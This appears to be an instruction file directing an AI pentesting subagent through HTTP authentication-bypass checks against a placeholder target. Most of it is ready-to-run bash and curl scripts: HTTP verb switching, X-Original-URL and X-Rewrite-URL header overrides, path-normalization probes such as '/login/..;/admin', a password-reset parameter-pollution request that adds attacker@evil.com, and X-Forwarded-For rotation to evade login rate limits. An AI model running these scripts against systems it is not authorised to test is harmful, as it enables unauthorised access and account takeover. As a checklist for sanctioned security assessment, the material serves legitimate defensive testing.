# Subagent 02: HTTP Protocol & Middleware Header Bypasses

## Role & Mission
Responsible for circumventing access control filters via HTTP protocol-level manipulations: HTTP verb/method switching (GET/POST/PUT/HEAD), reverse proxy override headers (`X-Original-URL`, `X-Rewrite-URL`), path traversal differentials (`/login/..;/admin`), HTTP Parameter Pollution (HPP), and API key query leakage.

## Assigned Checklist Tasks (6 Checks)
- **Check 06:** Authentication bypass via HTTP method switching (POST -> GET, HEAD, PUT, OPTIONS)
- **Check 15:** `X-Forwarded-For` and client IP header rotation to bypass IP rate limiting
- **Check 16:** `X-Original-URL` and `X-Rewrite-URL` headers to bypass authentication middleware
- **Check 17:** Authentication bypass via URL path manipulation (`/api/v1/` vs `/api/v2/`, `..;/`)
- **Check 18:** HTTP Parameter Pollution (HPP) in authentication workflows
- **Check 19:** Authentication via API key in URL query string (leakage in access logs & Referer)

---

## Standardized Execution Playbook

### Step 1: HTTP Method Switching (Check 06)
Some web frameworks and security filters (WAFs, Spring Security, Express middleware) only enforce authentication on specific verbs like `POST`:

```bash
# Switch HTTP verbs against protected endpoints:
METHODS=("GET" "POST" "HEAD" "PUT" "OPTIONS" "TRACE" "PATCH")

for m in "${METHODS[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X "$m" "https://<target>/admin/dashboard")
  echo "Method $m on /admin/dashboard -> HTTP $STATUS"
  if [ "$STATUS" = "200" ]; then
    echo "[!] HIGH: Authentication bypassed via verb switching ($m)" >> artifacts/auth_bypasses_confirmed.txt
  fi
done
```

### Step 2: Reverse Proxy Header Overrides (Check 16 & KongList.txt)
When reverse proxies (Nginx, Apache, HAProxy, Envoy) inspect URLs to block `/admin`, they often forward original URLs in headers to backend frameworks:

```bash
# Send request to allowed public path (e.g. / or /login) with override headers
curl -s -i "https://<target>/" \
  -H "X-Original-URL: /admin" \
  -H "X-Rewrite-URL: /admin" \
  -H "X-Custom-IP-Authorization: 127.0.0.1" > artifacts/header_override_test.txt

if grep -qiE "(Dashboard|Admin Panel|Logout)" artifacts/header_override_test.txt; then
  echo "[!] CRITICAL: Authentication Bypassed via X-Original-URL / X-Rewrite-URL!" >> artifacts/auth_bypasses_confirmed.txt
fi
```

### Step 3: URL Path Manipulation & Normalization Differentials (Check 17)
Proxy and backend webservers often parse path traversals differently:

```bash
PATH_PROBES=(
  "/login/..;/admin"
  "/login/..%2fadmin"
  "//admin//"
  "/admin/."
  "/admin%20"
  "/admin%09"
  "/api/v2/admin"  # In case v1 is protected but v2 is unauthenticated
  "/api/v0/admin"
)

for pp in "${PATH_PROBES[@]}"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://<target>${pp}")
  if [ "$STATUS" = "200" ]; then
    echo "[!] Path normalization bypass: ${pp} -> HTTP 200" >> artifacts/path_bypasses.txt
  fi
done
```

### Step 4: HTTP Parameter Pollution (HPP) in Auth (Check 18)
Sending duplicate parameters triggers different behavior depending on the backend technology:
- **PHP / Apache:** Uses the *last* parameter occurrence.
- **Node.js / Express:** Concatenates parameters into an array (`['victim@target.com', 'attacker@target.com']`).
- **ASP.NET:** Joins parameters with a comma (`victim@target.com,attacker@target.com`).

```bash
# Submit duplicate parameters in login / password reset
curl -s -X POST "https://<target>/api/auth/reset-password" \
  -d "email=victim@target.com&email=attacker@evil.com"
```

### Step 5: IP Rate-Limiting Bypasses via Header Rotation (Check 15)
```bash
# Rotate IP headers during high-velocity attempts
for ip in "127.0.0.1" "10.0.0.1" "192.168.1.1" "1.1.1.1"; do
  curl -s -X POST "https://<target>/api/auth/login" \
    -H "X-Forwarded-For: $ip" \
    -H "X-Client-IP: $ip" \
    -H "X-Real-IP: $ip" \
    -d "{\"username\":\"admin\",\"password\":\"test\"}"
done
```

### Step 6: API Key in Query String Leakage (Check 19)
Verify if sensitive API tokens are transmitted in GET query parameters (`https://target.com/api/data?api_key=XYZ123`):
- Leaks into browser history.
- Leaks into server proxy access logs.
- Leaks into third-party `Referer` headers.

---

## Output Artifact
Aggregate findings into:
`artifacts/subagent_02_middleware_bypasses.md`
